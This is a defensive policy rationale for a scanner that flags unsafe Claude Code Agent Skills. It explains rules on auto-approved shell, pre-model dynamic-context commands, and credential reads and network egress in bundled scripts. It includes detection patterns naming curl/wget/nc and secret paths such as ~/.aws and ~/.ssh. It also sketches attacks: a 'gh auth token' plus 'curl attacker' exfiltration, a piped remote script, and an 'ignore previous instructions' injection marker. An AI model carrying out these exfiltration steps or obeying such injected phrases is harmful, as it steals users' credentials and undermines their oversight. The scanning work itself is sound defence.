---
policy_id: claude_skill_safety
category: claude_skill
topic: skill_safety
rules:
  - id: CSKILL-001
    severity: critical
    confidence: 0.95
    scope: skill
    fix_type: config
  - id: CSKILL-002
    severity: high
    confidence: 0.9
    scope: skill
    fix_type: config
  - id: CSKILL-003
    severity: critical
    confidence: 0.85
    scope: skill
    fix_type: config
  - id: CSKILL-010
    severity: high
    confidence: 0.7
    scope: skill
    fix_type: code
  - id: CSKILL-011
    severity: critical
    confidence: 0.8
    scope: skill
    fix_type: code
  - id: CSKILL-020
    severity: medium
    confidence: 0.7
    scope: skill
    fix_type: config
  - id: CSKILL-040
    severity: medium
    confidence: 0.6
    scope: skill
    fix_type: config
  - id: CSKILL-050
    severity: high
    confidence: 0.8
    scope: skill
    fix_type: config
references: [LLM01, LLM02, LLM03, LLM06]
---

# Policy Rationale: Agent Skill Safety

**Policy ID:** `claude_skill_safety`  
**File:** `claude_skill/skill_safety.yaml`  
**Rules:** CSKILL-001, CSKILL-002, CSKILL-003, CSKILL-010, CSKILL-011, CSKILL-020, CSKILL-040, CSKILL-050  
**Severities:** critical, high, critical, high, critical, medium, medium, high  
**Fix types:** config (SKILL.md edits) + code (bundled-script edits for CSKILL-010/011)  
**References:** LLM01, LLM02, LLM03, LLM06

> Bundled-script content analysis now ships (CSKILL-010/011: network egress and
> credential reads inside bundled scripts). Hardcoded-secret scanning
> (CSKILL-030) and description-vs-capability matching remain planned — they need
> further discovery (secret scanning; heuristic capability comparison) — and are
> not yet shipped.

---

## What this policy covers

Claude Code **Agent Skills** — `SKILL.md` folders discovered at any depth
(`.claude/skills/<name>/SKILL.md`, personal `~/.claude/skills/`, plugin
`skills/`, and the merged `.claude/commands/*.md` form). These rules fire per
skill (`scope: skill`) against the parsed frontmatter and the markdown body, via
predicates over the discovered `SkillDef`. Because the surface is markdown, the
rules carry no `language:` field and fire regardless of the surrounding codebase.

A skill is a uniquely potent supply-chain surface: its `description` is **always
loaded into Claude's context**, its body loads on trigger, and it can carry
auto-approved tool grants, bundled executable scripts, and — in Claude Code —
**dynamic-context shell commands that run before the model ever sees the
skill**. Empirical study of public skill marketplaces (Snyk ToxicSkills, 2026)
found a security flaw in roughly a third of skills, with script-bundling skills
markedly worse than instruction-only ones. Skills are third-party code you
execute; these rules flag the patterns that make a skill dangerous on
activation.

---

## Why skill frontmatter and body are a distinct concern

Two Claude Code mechanics make a skill more dangerous than ordinary prose:

1. **`allowed-tools` is auto-approval, not a sandbox.** Claude Code docs are
   explicit: while a skill is active, `allowed-tools` grants the listed tools
   *without prompting* — it does not restrict the tool pool. `allowed-tools:
   Bash(*)` therefore auto-runs any shell command. (OWASP LLM06, excessive
   agency.)

2. **Dynamic-context injection runs pre-model.** A `` !`<command>` `` line or a
   ` ```! ` fenced block in `SKILL.md` is executed *during preprocessing, before
   the rendered skill reaches the model* — "this is preprocessing, not something
   Claude executes." Model-level prompt-injection defenses never see it; "the
   model may later refuse to continue, but by then the command has already
   executed." A dynamic-context command that reads a credential and POSTs it to
   an external host completes the exfiltration during skill load. (LLM01 +
   LLM02.)

On top of these, a skill's always-loaded `description` and on-trigger body are a
prompt-injection channel (LLM01), and external URLs in the body pull
attacker-controllable content into the loop (LLM01) and double as exfiltration
endpoints. Skills spread by sharing and forking (LLM03, supply chain), so an
over-privileged template propagates its blast radius wherever it is reused.

---

## Rule-by-rule defense

### CSKILL-001 — Skill auto-approves unrestricted shell (critical, 0.95, config)

**What we detect:** `allowed-tools` grants unrestricted shell — a bare `Bash`
token or a wildcard `Bash(*)` / `Bash(:*)` (`skill_allows_unrestricted_shell`).

**Why it is flaggable:** `allowed-tools` is an auto-approval list. An
unrestricted `Bash` grant means any shell command the skill issues runs without
a prompt — combined with bundled scripts and dynamic-context commands, that is
arbitrary local code execution on activation.

**Real-world consequence:** A "setup helper" skill shipping `allowed-tools:
Bash(*)` runs any command it (or an injected instruction) chooses the moment it
activates, with no per-command approval.

**Why critical:** Auto-approved arbitrary shell is maximal agency *and* the
approval gate — the user's last line of defense — is removed. Confidence 0.95:
the grant is read directly from frontmatter; the only gap is a skill that
genuinely needs broad shell (a build runner), which should still scope its
grants.

### CSKILL-002 — Skill runs shell during load, dynamic-context execution (high, 0.9, config)

**What we detect:** The body contains dynamic-context execution — inline
`` !`cmd` `` or a ` ```! ` block (`skill_body_has_dynamic_exec`).

**Why it is flaggable:** These commands run pre-model. Whatever they do has
already happened before Claude — or its injection defenses — can weigh in.

**Real-world consequence:** A skill that inlines `` !`gh pr diff` `` is benign;
the same mechanism with a side-effecting or data-reading command is not, and the
two are indistinguishable to the model because neither reaches it as a tool call.

**Why high (not critical):** Presence of dynamic-context execution is a strong
risk signal but not proof of harm (read-only uses exist) — CSKILL-003 escalates
the egress/secret case to critical. Confidence 0.9: the grammar match is precise.

### CSKILL-003 — Dynamic-context command performs network egress or reads secrets (critical, 0.85, config)

**What we detect:** A dynamic-context command matches network egress
(`curl`/`wget`/`nc`/…) or credential/secret access (`gh auth`, `$AWS_*`,
`~/.aws`, `~/.ssh`, `id_rsa`, `*_key`, …) (`skill_dynamic_exec_touches_network_or_secrets`).

**Why it is flaggable:** This is the pre-model exfiltration primitive: a secret
is read, or data is shipped out, during skill load — before any review.

**Real-world consequence:** The documented "Clawsights"-style attack —
`` !`gh auth token` `` paired with a `` !`curl attacker` `` — harvests a token
and exfiltrates it at activation, fully outside the model's view.

**Why critical:** Confidentiality impact realized before any gate, via a
mechanism designed to be invisible to the model. Confidence 0.85 (below 001):
the egress/secret heuristic can match a legitimate read-only command, so a
small false-positive margin is priced in.

### CSKILL-010 — Bundled skill script performs network egress (high, 0.7, code)

**What we detect:** A script bundled in the skill's directory (a `.sh`/`.py`/…
file the skill can run via Bash) makes outbound network calls — `curl`/`wget`/
`nc`/… — found by reading the script's **content**, not just inventorying its
path (`skill_bundled_script_network_egress`).

**Why it is flaggable:** Body-only scanners read `SKILL.md` and miss payloads
parked in an auxiliary or "test" file. A bundled `curl … | bash` loads and runs
remote code on activation; paired with credential access in the same script it
becomes data exfiltration.

**Real-world consequence:** The Snyk/VentureBeat "test-file bypass" — a skill
whose `SKILL.md` looks benign but whose `scripts/setup.sh` pipes a remote script
into a shell, executed with the user's privileges the moment the skill runs.

**Why high / confidence 0.7:** Egress in a bundled script is a strong signal but
not proof of harm (a script may legitimately fetch a pinned dependency), so it is
high rather than critical, with a confidence that prices in benign installers.

### CSKILL-011 — Bundled skill script reads credentials or secrets (critical, 0.8, code)

**What we detect:** A bundled script reads credentials or secrets — `gh auth`,
`$AWS_*`, `~/.aws`, `~/.ssh`, `id_rsa`, `*_key`, … — detected by reading the
script body (`skill_bundled_script_reads_secrets`).

**Why it is flaggable:** A skill runs its bundled scripts, so a credential read
hidden outside `SKILL.md` is a theft primitive that body-only scanning never
sees. Combined with a network call in the same script (CSKILL-010) it is direct
credential exfiltration.

**Real-world consequence:** A "sync auth" helper whose bundled script reads
`~/.aws/credentials` and base64-encodes it into a `curl` query string — exactly
the aux-file payload competitor tools demonstrably miss.

**Why critical:** Confidentiality impact (credential theft) realized on
activation and hidden from review. Confidence 0.8: the secret-read heuristic can
match a legitimate credential-management script, so a small false-positive margin
is priced in below the auto-shell rules.

### CSKILL-020 — Skill fetches untrusted external content (medium, 0.7, config)

**What we detect:** The body references an external `http(s)` URL
(`skill_references_external_url`).

**Why it is flaggable:** Fetched external content is an indirect-injection vector
(LLM01) and the URL is a candidate exfiltration endpoint; external dependencies
can also change after review.

**Why medium / confidence 0.7:** Many legitimate skills cite a doc URL, so URL
presence alone is a review prompt, not a verdict — hence medium and a confidence
that admits frequent benign matches.

### CSKILL-040 — Skill body contains prompt-injection markers (medium, 0.6, config)

**What we detect:** Instruction-override phrasing ("ignore previous
instructions"), invisible Unicode used to smuggle hidden text (zero-width
characters, the Unicode Tags block U+E0000–E007F, or bidirectional overrides), or
a long base64 blob (`skill_body_has_injection_marker`).

**Why it is flaggable:** The description and body enter Claude's context, so an
injected instruction here can hijack the agent (LLM01) — including one a human
reviewer literally cannot see. Invisible-Unicode smuggling (Tags-block "ASCII
smuggling", Trojan-Source bidi overrides) and base64 blobs have no legitimate
place in skill prose.

**Why medium / confidence 0.6:** The heuristics are deliberately broad and
FP-prone (a base64 data sample, a doc *about* prompt injection) — the lowest
confidence in the pack, shipped as a review nudge, not an assertion.

### CSKILL-050 — Model-invocable skill grants side-effecting tools (high, 0.8, config)

**What we detect:** The skill is model-invocable (no `disable-model-invocation`)
**and** pre-approves a side-effecting tool — `Bash`/`Write`/`Edit`/`WebFetch`/
`NotebookEdit` (`all` of `skill_model_invocable` + `skill_allows_tool`).

**Why it is flaggable:** Claude can trigger the skill on its own — steered by an
ambiguous request or an injected instruction — and the skill's auto-approved
tools then act without the user choosing to (LLM06).

**Why high / confidence 0.8:** Two conditions must hold, so the match is
specific; the residual gap is a skill that legitimately wants model invocation
*and* a write tool (rare for a safe design).

---

## What this policy does not cover (v1)

- **Bundled-script risks beyond egress/secret-read.** CSKILL-010/011 now read
  bundled scripts for network egress and credential reads, but other in-script
  risks (destructive filesystem ops, obfuscated/encoded payloads that evade the
  regex) are not yet modeled.
- **Hardcoded secrets** in `SKILL.md` or bundled files. (Planned: CSKILL-030.)
- **Description-vs-capability mismatch** — judging a "read-only-sounding"
  description against its grants is heuristic and FP-prone; deferred.
- **Obfuscated payloads** — aliased/encoded dynamic-context commands evade the
  egress/secret regex; a determined attacker can hide intent.
- **Whether `disableSkillShellExecution` is set** in managed settings (which
  would neutralize the dynamic-context rules) — a possible false positive the
  static check cannot see.
- **Runtime-fetched remote instructions** — the rules see the fetch (CSKILL-020),
  not the payload, which can change after review.

---

## Recommendations beyond the fix

```yaml
---
name: summarize-changes
description: Summarize uncommitted changes. Read-only; cannot run commands.
allowed-tools: Read Grep Bash(git diff *) Bash(git status *)
disable-model-invocation: true
---

Summarize the working-tree changes and flag anything risky.
```

1. **Least privilege:** enumerate exact commands in `allowed-tools`
   (`Bash(git diff *)`), never `Bash(*)`; prefer read-only tools.
2. **No pre-model side effects:** keep dynamic-context `` !`…` `` to read-only,
   side-effect-free data; never read credentials or hit the network there.
3. **Gate auto-invocation:** set `disable-model-invocation: true` on any skill
   that carries side effects, so only the user can trigger it.
4. **Treat skills as third-party code:** review `SKILL.md` and every bundled file
   before trusting a repo; for untrusted environments, set
   `disableSkillShellExecution: true` in managed settings.
